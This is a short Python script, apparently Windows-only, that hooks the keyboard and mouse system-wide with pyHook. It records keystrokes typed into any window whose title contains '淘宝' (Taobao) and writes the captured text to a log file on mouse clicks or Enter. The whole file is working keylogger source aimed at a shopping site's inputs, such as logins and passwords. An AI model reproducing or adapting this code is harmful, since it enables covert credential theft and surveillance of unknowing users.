#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author Greedywolf
import pythoncom
import pyHook
import time
import logging
import logging.config
#日志配置文件名
LOG_FILENAME = 'hook_logging.conf'

#日志语句提示信息
LOG_CONTENT_NAME = 'taobao_input_msg'
def log_init(log_config_filename,logname):
    logging.config.fileConfig(log_config_filename)
    logger=logging.getLogger(logname)
    return logger
def onMouseEvent(event):
    global MSG
    if len(MSG)!=0:
        hook_logger.info('current page:%s'%event.WindowName)
        hook_logger.error('information:%s'%MSG)
        MSG=''
    return True
def onKeyboardEvent(event):
    global MSG
    if event.WindowName.decode('GBK').find(u'淘宝')!=-1:
        if(127>=event.Ascii>31) or (event.Ascii==8):
            MSG+=chr(event.Ascii)
            hook_logger.info("ascii:%d(%s)"%(event.Ascii,str(event.key)))
        if(event.Ascii==0)or(event.Ascii==13):
            hook_logger.info('current page:%s'%event.WindowName)
            hook_logger.error('information:%s'%MSG)
            MSG=''
    return True
if __name__ == '__main__':
    hook_logger=log_init(LOG_FILENAME, LOG_CONTENT_NAME)
    MSG=''
    hm=pyHook.HookManager()
    hm.SubscribeMouseLeftDown(onMouseEvent)
    hm.HookMouse()
    hm.KeyDown=onKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages(1000)

